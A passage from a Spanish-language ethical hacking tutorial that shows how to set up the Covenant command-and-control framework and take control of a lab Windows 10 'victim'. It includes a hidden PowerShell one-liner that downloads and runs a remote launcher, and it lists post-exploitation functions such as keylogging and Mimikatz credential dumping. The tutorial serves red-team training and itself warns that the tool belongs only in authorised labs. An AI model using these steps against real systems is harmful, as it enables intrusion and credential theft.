https://127.0.0.1:7443
```

🔒 Ignora el error SSL (es un certificado autofirmado).

---

#### 5. Crear usuario

Cuando ingresas por primera vez, te pedirá crear un usuario admin. Luego ya puedes usar el panel gráfico.

---

### 🧪 Ejemplo completo de uso de Covenant

#### 🎯 Objetivo: obtener control de una máquina Windows 10 víctima

---

#### 1. Crear un Listener HTTPS

En el panel de Covenant:

- Ve a **"Listeners" > "Create Listener"**.
- Nombre: `https_listener`
- Puerto: `443` (o `7443`)
- Dirección: tu IP o localhost

Guarda.

---

#### 2. Crear un Grunt

En **"Grunts" > "Create Grunt"**:

- Selecciona el listener creado.
- Escoge el tipo de launcher (ejemplo: PowerShell).

Covenant generará un **script en PowerShell** que puedes usar para conectarte desde la víctima.

---

#### 3. Ejecutar el launcher en la víctima

En la máquina Windows 10, abre PowerShell (con permisos si es posible) y ejecuta el script generado.

Ejemplo (simplificado):

```powershell
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://IP:PORT/launcher')"
```

---

#### 4. Ver el Grunt activo

Si todo va bien, en Covenant verás al nuevo **Grunt conectado** (la víctima). Haz clic sobre él para abrir su consola.

---

#### 5. Ejecutar comandos en la máquina víctima

Ya puedes:

- Navegar el sistema de archivos.
- Obtener hashes.
- Usar Mimikatz.
- Descargar archivos.
- Elevar privilegios.

Ejemplo de comando en la consola del Grunt:

```bash
whoami
```

---

### 🧱 ¿Qué puedes hacer desde el Grunt?

Comandos comunes:

| Comando         | Función              |
| --------------- | -------------------- |
| `ShellCmd`      | Ejecuta comandos CMD |
| `PowerShell`    | Ejecuta PowerShell   |
| `Keylogger`     | Captura pulsaciones  |
| `Mimikatz`      | Extrae credenciales  |
| `Screenshot`    | Captura pantalla     |
| `ListProcesses` | Lista procesos       |

---

### 🧯 Errores comunes y soluciones

| Error                    | Solución                                                                        |
| ------------------------ | ------------------------------------------------------------------------------- |
| .NET no encontrado       | Instala: `dotnet-sdk-6.0`                                                       |
| Grunt no se conecta      | Verifica el firewall o IP                                                       |
| Certificado SSL da error | Usa Firefox y omite advertencia                                                 |
| `dotnet run` falla       | Asegura que estás en `Covenant/Covenant` y usa `git clone --recurse-submodules` |

---

### 🛡️ Importante

⚠️ Covenant debe usarse **solo en laboratorios controlados o con autorización explícita**. Usarlo en sistemas ajenos sin permiso es ilegal.

---

### ✅ Conclusión

Covenant es una herramienta poderosa para:

- **Controlar sistemas comprometidos**.
- **Ejecutar ataques post-explotación**.
- **Practicar Red Teaming en entornos seguros**.

---

[🔼](#índice)

---

| **Inicio**         | **atrás 2**                                               | **Siguiente 4**                                                  |
| ------------------ | --------------------------------------------------------- | ---------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./5_2_Hacking_Etico_en_Entornos_Active_Directory.md) | [⏩](./5_4_Hacking_avanzado_de_aplicaciones_web_y_bug_bounty.md) |
